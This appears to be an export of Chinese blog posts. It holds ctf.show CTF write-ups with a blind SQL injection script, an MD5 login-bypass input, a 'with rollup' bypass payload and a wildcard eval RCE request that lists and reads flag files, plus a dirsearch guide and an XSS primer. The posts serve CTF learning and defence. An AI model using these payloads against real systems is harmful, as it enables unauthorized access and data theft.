<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">import requests</span><br><span class="line">s=requests.session()</span><br><span class="line">url=&#x27;http://1a52462e-b3aa-4f50-8445-0792a199259e.chall.ctf.show/index.php&#x27;</span><br><span class="line">table=&quot;&quot;</span><br><span class="line"></span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line">&#x27; and ascii(substr((select database()),1,1))=xx #</span><br><span class="line">这样的话写个脚本很容易跑出来了，过滤逗号之后可以变成这样</span><br><span class="line"></span><br><span class="line">&#x27; and ascii(substr((select database())from 1 for 1))=xx #</span><br><span class="line">这应该是substring函数的两种用法</span><br><span class="line">&quot;&quot;&quot;</span><br><span class="line"></span><br><span class="line">for i in range(1,45):</span><br><span class="line">    print(i)</span><br><span class="line">    for j in range(31,128):</span><br><span class="line">        #爆表名  flag</span><br><span class="line">        #payload = &quot;ascii(substr((select/**/group_concat(table_name)/**/from/**/information_schema.tables/**/where/**/table_schema=database())from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span><br><span class="line">        #爆字段名 flag</span><br><span class="line">        #payload = &quot;ascii(substr((select/**/group_concat(column_name)/**/from/**/information_schema.columns/**/where/**/table_name=0x666C6167)from/**/%s/**/for/**/1))=%s#&quot;%(str(i),str(j))</span><br><span class="line">        #读取flag</span><br><span class="line">        payload = &quot;ascii(substr((select/**/flag/**/from/**/flag)from/**/%s/**/for/**/1))=%s#&quot;%(str(i), str(j))</span><br><span class="line"></span><br><span class="line">        ra = s.get(url=url + &#x27;?id=0/**/or/**/&#x27; + payload).text</span><br><span class="line"></span><br><span class="line">        if &#x27;I asked nothing&#x27; in ra:</span><br><span class="line">            table += chr(j)</span><br><span class="line">            print(table)</span><br><span class="line">            break</span><br></pre></td></tr></table></figure>

<p>得到flag</p>
<h1 id="web9"><a href="#web9" class="headerlink" title="web9"></a>web9</h1><p> 进去以后就是一个登录界面, 盲猜是个SQL注入漏洞,行不通<br> 就觉得该换个思路</p>
<p>那就扫描下目录吧,dirsearch扫出了一个robots.txt</p>
<p>我们访问根目录下的 robots.txt 文件</p>
<pre><code>robots.txt是一个文本文件,同时也是一个协议,规定了爬虫访问的规则( 哪些文件可以爬取,哪些文件不可以爬取)
</code></pre>
<p> 从robots.txt文件的内容中可以发现, 作者给了提示, index.phps文件应该就是此关卡的源码文件</p>
<p> 然后就是访问这个地址给你一个下载链接我们直接打开得到</p>
 <figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">        $flag=&quot;&quot;;</span><br><span class="line">		$password=$_POST[&#x27;password&#x27;];</span><br><span class="line">		if(strlen($password)&gt;10)&#123;</span><br><span class="line">			die(&quot;password error&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		$sql=&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;</span><br><span class="line">		$result=mysqli_query($con,$sql);</span><br><span class="line">			if(mysqli_num_rows($result)&gt;0)&#123;</span><br><span class="line">					while($row=mysqli_fetch_assoc($result))&#123;</span><br><span class="line">						 echo &quot;登陆成功&lt;br&gt;&quot;;</span><br><span class="line">						 echo $flag;</span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>

<p> 从源码中可以发现, SQL中使用了md5()函数加密, 我们可以利用MD5加密漏洞来绕过</p>
<p>考验你的代码审计，如果php有没怎么学的建议恶补一下，学一下语法和php的数据库连接</p>
<pre><code>$sql=&quot;select * from user where username =&#39;admin&#39; and password =&#39;&quot;.md5($password,true).&quot;&#39;&quot;;
        $result=mysqli_query($con,$sql);
            if(mysqli_num_rows($result)&gt;0)&#123;
                while($row=mysqli_fetch_assoc($result))&#123;
                         echo &quot;登陆成功&lt;br&gt;&quot;;
                         echo $flag;
</code></pre>
<p>我们主要看这一块，那些mysqli什么的函数如果没用过直接上菜鸟搜函数的作用，下面的函数大概就是如果能成功访问到数据库获得那些行值就能执行while 那也就是说 r e s u l t 这 个 值 必 须 是 正 确 的 ， 那 我 们 就 来 看 看 result这个值必须是正确的， 那我们就来看看 result这个值必须是正确的，那我们就来看看result</p>
<pre><code>$result=mysqli_query($con,$sql);
</code></pre>
<p>和 s q l 是 有 关 系 的 也 就 是 sql 是有关系的 也就是 sql是有关系的也就是sql的查询语句要是正确的，那我们接下来看</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">$sql=&quot;select * from user where username =&#x27;admin&#x27; and password =&#x27;&quot;.md5($password,true).&quot;&#x27;&quot;;</span><br></pre></td></tr></table></figure>

<p>username这一部分原网页里面就已经帮我填写了 那我们重点来看password这一块<br>首先了解一下md5这个函数后面有个参数默认是false返回32位的16进制数，而这里是true<br>菜鸟教程上给出的解释是TRUE - 原始 16 字符二进制格式 大致就是把你这一堆MD5值又弄成字符串了<br>大家想想前面值为真了,那这边如果是 or xxxxx的话不就是恒真了嘛。那就想想有什么字符输进去最后会转成 带 or 的，然后这里我就开始进行强大的搜索引擎了 最后找到篇博客 里面就是这道题，然后大佬给出了两个值一个是<br>129581926211651571912466741651878684928<br>另一个是<br>ffifdyop<br>那这样下次这样的题目如果判断全是数字就用上面，如果判断是字符就用下面</p>
<p>这边因为</p>
<figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="variable">$password</span>=<span class="variable">$_POST</span>[<span class="string">&#x27;password&#x27;</span>];</span><br><span class="line">		<span class="keyword">if</span>(<span class="title function_ invoke__">strlen</span>(<span class="variable">$password</span>)&gt;<span class="number">10</span>)&#123;</span><br><span class="line">			<span class="keyword">die</span>(<span class="string">&quot;password error&quot;</span>);</span><br><span class="line">		&#125;</span><br><span class="line"><span class="number">1234</span></span><br></pre></td></tr></table></figure>

<p>有限制长度</p>
<p>所以在密码框中输入 ffifdyop, 即可登录成功, 获取flag</p>
<h1 id="web10"><a href="#web10" class="headerlink" title="web10"></a>web10</h1><p>和web9一样。先查看一下源码，<br> 右键查看源代码<br> 进入style.css<br> 发现有index.phps<br> 在url处输入后，查看源码得到</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">		$flag=&quot;&quot;;</span><br><span class="line">        function replaceSpecialChar($strParam)&#123;</span><br><span class="line">             $regex = &quot;/(select|from|where|join|sleep|and|\s|union|,)/i&quot;;</span><br><span class="line">             return preg_replace($regex,&quot;&quot;,$strParam);</span><br><span class="line">        &#125;</span><br><span class="line">        if (!$con)</span><br><span class="line">        &#123;</span><br><span class="line">            die(&#x27;Could not connect: &#x27; . mysqli_error());</span><br><span class="line">        &#125;</span><br><span class="line">		if(strlen($username)!=strlen(replaceSpecialChar($username)))&#123;</span><br><span class="line">			die(&quot;sql inject error&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		if(strlen($password)!=strlen(replaceSpecialChar($password)))&#123;</span><br><span class="line">			die(&quot;sql inject error&quot;);</span><br><span class="line">		&#125;</span><br><span class="line">		$sql=&quot;select * from user where username = &#x27;$username&#x27;&quot;;</span><br><span class="line">		$result=mysqli_query($con,$sql);</span><br><span class="line">			if(mysqli_num_rows($result)&gt;0)&#123;</span><br><span class="line">					while($row=mysqli_fetch_assoc($result))&#123;</span><br><span class="line">						if($password==$row[&#x27;password&#x27;])&#123;</span><br><span class="line">							echo &quot;登陆成功&lt;br&gt;&quot;;</span><br><span class="line">							echo $flag;</span><br><span class="line">						&#125;</span><br><span class="line"></span><br><span class="line">					 &#125;</span><br><span class="line">			&#125;</span><br><span class="line">    ?&gt;</span><br></pre></td></tr></table></figure>

<p>发现被过滤了这些东西select|from|where|join|sleep|and|\s|union|,<br>又被这个避免了双写绕过if(strlen($password)!&#x3D;strlen(replaceSpecialChar($password))){ die(“sql inject error”);}</p>
<p>定义了过滤函数，对username和password进行过滤，然后判断输入的password是否对应根据我们输入的username从数据库中查到的密码</p>
<p>这时候，我们要用到group by和roll with<br>group by（将结果集中的数据行根据选择列的值进行逻辑分组）：<br>在使用group by以后会按照password中的值进行排列：<br>with rollup （group by 后可以跟with rollup，表示在进行分组统计的基础上再次进行汇总统计）<br>此时我们发现，多出一行NULL，并且count（*）为统计和。<br>加入with rollup后 password有一行为NULL。<br>payload在用户名框中进行输入，密码框不输入，使其为空，满足 p a s s w o r d &#x3D; &#x3D; password&#x3D;&#x3D; password&#x3D;&#x3D;row[‘password’]</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">username=admin&#x27;/**/or/**/1=1/**/group/**/by/**/password/**/with/**/rollup#&amp;password=</span><br></pre></td></tr></table></figure>

<h1 id="红包题第二弹"><a href="#红包题第二弹" class="headerlink" title="红包题第二弹"></a>红包题第二弹</h1><p>查看源代码，按注释提示，构造参数试试?cmd&#x3D;aa</p>
<pre><code>&lt;?php
#error_reporting(0);
?&gt;
&lt;html lang=&quot;zh-CN&quot;&gt;
 
&lt;head&gt;
    &lt;meta http-equiv=&quot;Content-Type&quot; content=&quot;text/html; charset=UTF-8&quot; /&gt;
    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width  minimum-scale=1.0  maximum-scale=1.0  initial-scale=1.0&quot; /&gt;
    &lt;title&gt;ctf.show_红包题&lt;/title&gt;
&lt;/head&gt;
&lt;body&gt;
    &lt;center&gt;
    &lt;h2&gt;ctf.show_红包题&lt;/h2&gt;
    &lt;h4&gt;where is the flag?&lt;/h4&gt;
    &lt;/center&gt;
    &lt;!-- hint:?cmd= --&gt;
    &lt;?php
        if(isset($_GET[&#39;cmd&#39;]))&#123;
            $cmd=$_GET[&#39;cmd&#39;];
            highlight_file(__FILE__);
            if(preg_match(&quot;/[A-Za-oq-z0-9$]+/&quot;,$cmd))&#123;
            
                die(&quot;cerror&quot;);
            &#125;
            if(preg_match(&quot;/\~|\!|\@|\#|\%|\^|\&amp;|\*|\(|\)|\（|\）|\-|\_|\&#123;|\&#125;|\[|\]|\&#39;|\&quot;|\:|\,/&quot;,$cmd))&#123;
                die(&quot;serror&quot;);
            &#125;
            eval($cmd);
        
        &#125;
    
     ?&gt;
 
&lt;/body&gt;
&lt;/html&gt;
</code></pre>
<p>源码中过滤了很多东西，可以使用的字符：p &#96; ? &#x2F; + &lt; &gt; &#x3D;</p>
<p>通过可用的字符构造cmd&#x3D;?&gt;&lt;?&#x3D;<code>.+/??p/p?p??????</code>，由eval（$cmd）来运行临时文件</p>
<p>备注：问号?代表一个任意字符，通配符&#x2F;??p&#x2F;p?p??????匹配&#x2F;tmp&#x2F;phpxxxxxx</p>
<p>构造payload</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">?cmd=?&gt;&lt;?=`.+/??p/p?p??????`;</span><br></pre></td></tr></table></figure>



<p>然后bp抓包，修改几个地方，发现根目录下有flag.txt</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /?cmd=?&gt;&lt;?=`.+/??p/p?p??????`; HTTP/1.1</span><br><span class="line">Host: 4947507e-e5ac-452c-8f01-80f5309742d9.challenge.ctf.show</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64; rv:109.0) Gecko/20100101 Firefox/109.0</span><br><span class="line">Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,*/*;q=0.8</span><br><span class="line">Content-Type: multipart/form-data; boundary=---------------------------10242300956292313528205888</span><br><span class="line">Accept-Language: zh-CN,zh;q=0.8,zh-TW;q=0.7,zh-HK;q=0.5,en-US;q=0.3,en;q=0.2</span><br><span class="line">Accept-Encoding: gzip, deflate</span><br><span class="line">Connection: close</span><br><span class="line">Content-Length: 237</span><br><span class="line"></span><br><span class="line">-----------------------------10242300956292313528205888</span><br><span class="line">Content-Disposition: form-data; name=&quot;fileUpload&quot;; filename=&quot;1.txt&quot;</span><br><span class="line">Content-Type: text/plain</span><br><span class="line"></span><br><span class="line">#! /bin/sh</span><br><span class="line"></span><br><span class="line">ls /</span><br><span class="line">-----------------------------10242300956292313528205888--</span><br></pre></td></tr></table></figure>

<p>修改命令为cat &#x2F;flag.txt 得到flag</p>
]]></content>
      <tags>
        <tag>ctf解题</tag>
      </tags>
  </entry>
  <entry>
    <title>dirsearch</title>
    <url>/2023/08/15/dirsearch/</url>
    <content><![CDATA[<h1 id="1-介绍"><a href="#1-介绍" class="headerlink" title="1.介绍"></a>1.介绍</h1><span id="more"></span>

<p>dirsearch是一个基于python3的命令行工具，常用于暴力扫描页面结构，包括网页中的目录和文件。</p>
<p>相比其他扫描工具disearch的特点是：</p>
<pre><code>支持HTTP代理
多线程
支持多种形式的网页（asp,php）
生成报告（纯文本，JSON）
启发式检测无效的网页
递归扫描
用户代理随机化
批量处理
扫描器与字典（注：字典必须是文本文件）
</code></pre>
<p>下载及安装<br> 要求:python 3.7或更高版本 </p>
<pre><code>其中，db文件夹为自带字典文件夹；reports为扫描日志文件夹；dirsearch.py为主程序文件 
</code></pre>
<h1 id="2-下载地址"><a href="#2-下载地址" class="headerlink" title="2.下载地址"></a>2.下载地址</h1><p><a href="https://github.com/maurosoria/dirsearch">https://github.com/maurosoria/dirsearch</a></p>
<p>目前版本是更新到0.42。</p>
<h1 id="3-下载到本地，安装使用"><a href="#3-下载到本地，安装使用" class="headerlink" title="3.下载到本地，安装使用"></a>3.下载到本地，安装使用</h1><p>pip3 install -r requirements.txt     &#x2F;&#x2F;安装依赖包</p>
<p>下载超时了，找国内镜像。如：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">pip3 install -r requirements.txt -i https://pypi.douban.com/simple</span><br></pre></td></tr></table></figure>

<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">阿里云：http://mirrors.aliyun.com/pypi/simple/</span><br></pre></td></tr></table></figure>

<p>python3 setup.py install</p>
<h1 id="4-使用命令"><a href="#4-使用命令" class="headerlink" title="4.使用命令"></a>4.使用命令</h1><p>常用命令<br>–version            显示dirsearch的版本<br>-h –help            帮助提示<br>-u  –url            指定网址<br>-e                   指定网站语言<br>-w                   指定字典<br>-r                   递归目录（跑出目录后，继续跑目录下面的目录）<br>-l  –url-list&#x3D;FILE  目标url文件路径<br>-i                   保留的响应状态码(以逗号分隔,支持指定范围) 如(-i 200,300-399)<br>-x                   排除的响应状态码(以逗号分隔,支持指定范围)  如(-x 301,500-599)</p>
<p>简单使用<br>&#x2F;&#x2F;简单的使用方法<br>python3 dirsearch.py -u <a href="https://target/">https://target</a><br>&#x2F;&#x2F;使用文件拓展名为php和txt以及js的字典扫描目标<br>python3 dirsearch.py -e php,txt,js -u <a href="https://target/">https://target</a><br>&#x2F;&#x2F;采用指定路径的wordlist且拓展名为php，txt，js的字典扫描目标url<br>python3 dirsearch.py -e php,txt,js -u <a href="https://target/">https://target</a> -w &#x2F;path&#x2F;to&#x2F;wordlist<br>&#x2F;&#x2F;采用递归扫描<br>python3 dirsearch.py -e php,txt,js -u <a href="https://target/">https://target</a> -r<br>&#x2F;&#x2F;采用递归扫描 递归层数为三层<br>python3 dirsearch.py -e php,txt,js -u <a href="https://target/">https://target</a> -r -R 3</p>
]]></content>
      <tags>
        <tag>tools</tag>
      </tags>
  </entry>
  <entry>
    <title>xss</title>
    <url>/2023/08/05/xss/</url>
    <content><![CDATA[<h2 id="一、XSS攻击简介"><a href="#一、XSS攻击简介" class="headerlink" title="一、XSS攻击简介"></a><strong>一、XSS攻击简介</strong></h2><span id="more"></span>

<p>XSS全称是Cross Site Scripting即跨站脚本，当目标网站目标用户浏览器渲染HTML文档的过程中，出现了不被预期的脚本指令并执行时，XSS就发生了。</p>
<p>作为一种HTML注入攻击，XSS攻击的核心思想就是在HTML页面中注入恶意代码，而XSS采用的注入方式是非常巧妙的。在XSS攻击中，一般有三个角色参与：攻击者、目标服务器、受害者的浏览器。</p>
<p>由于有的服务器并没有对用户的输入进行安全方面的验证，攻击者就可以很容易地通过正常的输入手段，夹带进一些恶意的HTML脚本代码。当受害者的浏览器访 问目标服务器上被注入恶意脚本的页面后，由于它对目标服务器的信任，这段恶意脚本的执行不会受到什么阻碍。而此时，攻击者的目的就已经达到了。</p>
<p>下面我们以一段简单的JavaScript脚本为例，来描述整个XSS攻击的过程：</p>
<p><code>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</code></p>
<p>上面这段脚本的执行具体内容就是弹出一个对话框显示用户的Cookie信息。攻击者在向目标服务器的某个页面进行数据输入的过程中，通过正常的输入方式夹带进这段脚本。假如一切正常的时候，生成的页面代码如下形式：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">…</span><br><span class="line">text //正常输入的数据</span><br><span class="line">…</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>如果用户的输入为text<code>&lt;script&gt;alert(document.cookie);&lt;/script&gt;</code>，而目标服务器又没有对这个输入进行检验的话，则会生成如下形式的页面代码：</p>
<figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;html&gt;</span><br><span class="line">…</span><br><span class="line">text</span><br><span class="line">&lt;script&gt;alert(document.cookie);&lt;/script&gt;</span><br><span class="line">…</span><br><span class="line">&lt;/html&gt;</span><br></pre></td></tr></table></figure>

<p>可以看到，这段脚本已经成功嵌入到该页面当中。当受害浏览器访问这个页面的时候，这段脚本也将被认为是页面的一部分，从而得到执行，即弹出对话框显示受害浏览器的Cookie信息。</p>
<h2 id="二、XSS原理"><a href="#二、XSS原理" class="headerlink" title="二、XSS原理"></a><strong>二、XSS原理</strong></h2><p>XSS的原理是恶意攻击者往 Web 页面里插入恶意可执行网页脚本代码，当用户浏览该页之时，嵌入其中 Web 里面的脚本代码会被执行，从而可以达到攻击者盗取用户信息或其他侵犯用户安全隐私的目的。</p>
<h2 id="三、XSS攻击类型"><a href="#三、XSS攻击类型" class="headerlink" title="三、XSS攻击类型"></a><strong>三、XSS攻击类型</strong></h2><p>根据XSS脚本注入方式的不同，我们可以将XSS攻击简单的分类为反射型XSS、存储型XSS、DOM-based 型、基于字符集的 XSS、基于 Flash 的跨站 XSS、未经验证的跳转 XSS 6种类型。</p>
<h3 id="1、反射型XSS（非持久型XSS）"><a href="#1、反射型XSS（非持久型XSS）" class="headerlink" title="1、反射型XSS（非持久型XSS）"></a><strong>1、反射型XSS（非持久型XSS）</strong></h3><p>又称<strong>非持久型XSS</strong>。之所以称为反射型XSS，是因为这种攻击方式的注入代码是从目标服务器通过错误信息、搜索结果等等方式“反射”回来的：发出请求时，XSS代码出现在URL中，作为输入提交到服务器端，服务器端解析后响应，XSS代码随响应内容一起传回给浏览器，最后浏览器解析执行XSS代码。这个过程像一次反射，故叫反射型XSS。 而称为非持久型XSS，则是因为这种攻击方式具有一次性，由于代码注入的是一个动态产生的页面而不是永久的页面，因此这种攻击方式只在点击链接的时候才产生作用。</p>
<p>攻击者通过电子邮件等方式给别人发送带有恶意脚本代码参数的 URL，当 URL 地址被打开时，注入脚本被传输到目标服务器上，然后服务器将注入脚本“反射”到受害者的浏览器上，特有的恶意代码参数被 HTML 解析、执行。</p>
<p>非持久型 XSS 漏洞攻击的<strong>四大特点</strong>：① 即时性。不经过服务器存储，直接通过 HTTP 的 GET 和 POST 请求就能完成一次攻击，拿到用户隐私数据；②攻击者需要诱骗点击；③反馈率低，所以较难发现和响应修复；④盗取用户敏感保密信息。</p>
<p>防止出现非持久型 XSS 漏洞的<strong>五大措施</strong>：① Web 页面渲染的所有内容或者渲染的数据都必须来自于服务端；②尽量不要从 URL，document.referrer，document.forms 等这种 DOM API 中获取数据直接渲染；③尽量不要使用 eval, new Function()，document.write()，document.writeln()，window.setInterval()，window.setTimeout()，innerHTML，document.creteElement() 等可执行字符串的方法；④如果做不到以上几点，也必须对涉及 DOM 渲染的方法传入的字符串参数做 escape 转义；⑤ 前端渲染的时候对任何的字段都需要做 escape 转义编码。</p>
<h3 id="2、存储型XSS（持久型XSS）"><a href="#2、存储型XSS（持久型XSS）" class="headerlink" title="2、存储型XSS（持久型XSS）"></a><strong>2、存储型XSS（持久型XSS）</strong></h3><p>存储型XSS，又称持久型XSS，他和反射型XSS最大的不同就是，攻击脚本将被永久地存放在目标服务器端（数据库，内存，文件系统等），下次请求目标页面时不用再提交XSS代码。</p>
<p>一般存在于 Form 表单提交等交互功能，如发帖留言，提交文本信息等，黑客利用的 XSS 漏洞，将内容经正常功能提交进入数据库持久保存，当前端页面获得后端从数据库中读出的注入代码时，恰好将其渲染执行。</p>
<p>这种攻击多见于论坛，攻击者在发帖的过程中，将恶意脚本连同正常信息一起注入到帖子的内容之中。随着帖子被论坛服务器存储下来，恶意脚本也永久地被存放在论坛服务器的后端存储器中。当其它用户浏览这个被注入了恶意脚本的帖子的时候，恶意脚本则会在他们的浏览器中得到执行，从而受到了攻击。</p>
<p>可以看到，存储型XSS的攻击方式能够将恶意代码永久地嵌入一个页面当中，所有访问这个页面的用户都将成为受害者。如果我们能够谨慎对待不明链接，那么反射型的XSS攻击将没有多大作为，而存储型XSS则不同，由于它注入的往往是一些我们所信任的页面，因此无论我们多么小心，都难免会受到攻击。可以说，存储型XSS更具有隐蔽性，带来的危害也更大，除非服务器能完全阻止注入，否则任何人都很有可能受到攻击。</p>
<p>持久型 XSS 的三<strong>大特点</strong>：①持久性，植入在数据库中；②危害面广，甚至可以让用户机器变成 DDoS 攻击的肉鸡；③ 盗取用户敏感私密信息。</p>
<p>防止持久型 XSS 漏洞的<strong>三大措施：</strong> ①后端在入库前应该选择不相信任何前端数据，将所有的字段统一进行转义处理；②后端在输出给前端数据统一进行转义处理；③前端在渲染页面 DOM 的时候应该选择不相信任何后端数据，任何字段都需要做转义处理。</p>
<h3 id="3、DOM-based-型"><a href="#3、DOM-based-型" class="headerlink" title="3、DOM-based 型"></a><strong>3、DOM-based 型</strong></h3><p>客户端的脚本程序可以动态地检查和修改页面内容，而不依赖于服务器端的数据。例如客户端如从 URL 中提取数据并在本地执行，如果用户在客户端输入的数据包含了恶意的 JavaScript 脚本，而这些脚本没有经过适当的过滤和消毒，那么应用程序就可能受到 DOM-based XSS 攻击。需要特别注意以下的用户输入源 document.URL、 location.hash、 location.search、 document.referrer 等。</p>
<h3 id="4、基于字符集的-XSS"><a href="#4、基于字符集的-XSS" class="headerlink" title="4、基于字符集的 XSS"></a><strong>4、基于字符集的 XSS</strong></h3><p>哪怕现在很多的浏览器以及各种开源的库都专门针对了 XSS 进行转义处理，尽量默认抵御绝大多数 XSS 攻击，但是还是有很多方式可以绕过转义规则，让人防不胜防。比如「基于字符集的 XSS 攻击」就是绕过这些转义处理的一种攻击方式，比如有些 Web 页面字符集不固定，用户输入非期望字符集的字符，有时会绕过转义过滤规则。</p>
<p>可以形成「基于字符集的 XSS 攻击」的原因是由于浏览器在 meta 没有指定 charset 的时候有自动识别编码的机制，所以这类攻击通常就是发生在没有指定或者没来得及指定 meta 标签的 charset 的情况下。</p>
<p>避免基于字符集的 XSS 攻击的<strong>两大方法：</strong>①记住指定 <meta charset="utf-8">；② XML 中不仅要指定字符集为 utf-8，而且标签要闭合。</p>
<h3 id="5、基于-Flash-的跨站-XSS"><a href="#5、基于-Flash-的跨站-XSS" class="headerlink" title="5、基于 Flash 的跨站 XSS"></a><strong>5、基于 Flash 的跨站 XSS</strong></h3><p>基于 Flash 的跨站 XSS 也是属于反射型 XSS 的一种，AS 脚本可以接受用户输入并操作 cookie，攻击者可以配合其他 XSS（持久型或者非持久型）方法将恶意 swf 文件嵌入页面中。主要是因为 AS 有时候需要和 JS 传参交互，攻击者会通过恶意的 XSS 注入篡改参数，窃取并操作cookie。</p>
<p>基于 Flash 的跨站 XSS 的<strong>两种避免方法</strong> <strong>：</strong>①严格管理 cookie 的读写权限；②对 Flash 能接受用户输入的参数进行过滤 escape 转义处理。</p>
<h3 id="6、未经验证的跳转-XSS"><a href="#6、未经验证的跳转-XSS" class="headerlink" title="6、未经验证的跳转 XSS"></a><strong>6、未经验证的跳转 XSS</strong></h3><p>有一些场景是后端需要对一个传进来的待跳转的 URL 参数进行一个 302 跳转，可能其中会带有一些用户的敏感（cookie）信息。如果服务器端做302 跳转，跳转的地址来自用户的输入，攻击者可以输入一个恶意的跳转地址来执行脚本。</p>
<p>防止未经验证的跳转 XSS漏洞的<strong>两种措施：</strong>①对待跳转的 URL 参数做白名单或者某种规则过滤；②后端注意对敏感信息的保护, 比如 cookie 使用来源验证。</p>
]]></content>
      <tags>
        <tag>xss</tag>
      </tags>
  </entry>
</search>
